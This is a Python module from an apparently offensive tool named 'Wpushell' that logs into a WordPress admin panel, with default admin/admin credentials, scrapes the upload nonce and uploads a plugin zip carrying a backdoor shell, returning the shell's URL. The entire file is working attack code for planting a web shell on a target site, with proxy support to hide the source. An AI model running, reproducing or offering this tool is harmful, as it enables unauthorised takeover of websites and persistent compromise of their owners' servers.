#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Wpushell is a tool used to upload a backdoor shell to a site that uses a WordPress Content Management System with a simple and fast process.
Copyright (C) 2022 RandsX

This program is free software: you can redistribute it and/or modify  it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

from random import choice
from string import ascii_lowercase
from aiohttp import FormData
from aiohttp import ClientSession
from aiohttp import TCPConnector

class ClientRequest:
    """ ClientRequest class """
    def __init__(self, proxy: str, ssl: bool = True) -> None:
        """ Initialize the class """
        from aiohttp_socks import ProxyConnector

        connector = TCPConnector(ssl=ssl)
        if proxy:
            connector = ProxyConnector.from_url(proxy, ssl=ssl)
        self.session = ClientSession(connector=connector, trust_env=True)

    def _build_data(self, data: dict) -> FormData:
        """ Build form data """
        form = FormData(quote_fields=False)
        form.add_field('_wpnonce', data['wpnonce'])
        form.add_field('install-plugin-submit', 'Install Now')
        form.add_field('_wp_http_referer', f'{data["url"]}/wp-admin/plugin-install.php?tab=upload')
        form.add_field('pluginzip', data['plugin_content'], filename=data['upload_dir'], content_type='application/zip')

        return form

    async def get_cookie(self, url: str, username: str = 'admin', password: str = 'admin', timeout: int = 10) -> dict:
        """ get the cookie after login into target """
        url = f'{url}/wp-login.php'
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'rememberme': 'forever',
            'redirect_to': f'{url}/wp-admin',
            'testcookie': '1'
        }
        cookies: dict = {}

        try:
            request = await self.session.post(url, timeout=timeout, data=data)
            status_code = request.status
            if status_code == 200:
                for cookie in self.session.cookie_jar:
                    cookies[cookie.key] = cookie.value

                if bool(cookies) is False and len(cookies) <= 2:
                    raise Exception('Failed login into the target, please check your credential')
                return cookies
            else:
                raise Exception(f'Server not returned status code 200 OK, returned {status_code}')
        except Exception as error:
            raise Exception(error)

    async def get_wpnonce(self, url: str, cookies: dict, timeout: int) -> str:
        """ Take _wpnonce value from target """
        from bs4 import BeautifulSoup

        url = f'{url}/wp-admin/plugin-install.php?tab=upload'

        try:
            request = await self.session.get(url, timeout=timeout, cookies=cookies)
            status_code = request.status
            if status_code == 200:
                content = await request.text()
                try:
                    soup = BeautifulSoup(content, 'html.parser')
                    wpnonce = soup.find('input', {'name': '_wpnonce'})['value']
                    if wpnonce is None:
                        raise Exception('Failed to fetch value _wpnonce')
                    return wpnonce
                except Exception as err:
                    raise Exception(err)
            else:
                raise Exception(f'Server not returned status code 200 OK, returned {status_code}')
        except Exception as err:
            raise Exception(err)

    async def upload_shell(self, url: str, cookies: dict, timeout: int, wpnonce: str, plugin: dict) -> str:
        """ Upload shell backdoor plugin to target """
        url_upload = f'{url}/wp-admin/update.php?action=upload-plugin'
        upload_dir = ('' .join(choice(ascii_lowercase) for _ in range(10)))
        data = {
            'url': url,
            'wpnonce': wpnonce,
            'upload_dir': upload_dir,
            'plugin_content': plugin['content']
        }
        form_data = self._build_data(data)

        try:
            request = await self.session.post(url_upload, timeout=timeout, cookies=cookies, data=form_data)
            status_code = request.status
            if status_code == 200:
                return f'{url}/wp-content/plugins/{upload_dir}/{plugin["shell_name"]}'
            else:
                raise Exception(f'Server not returned status code 200 OK, returned {status_code}')
        except Exception as err:
            raise Exception(err)
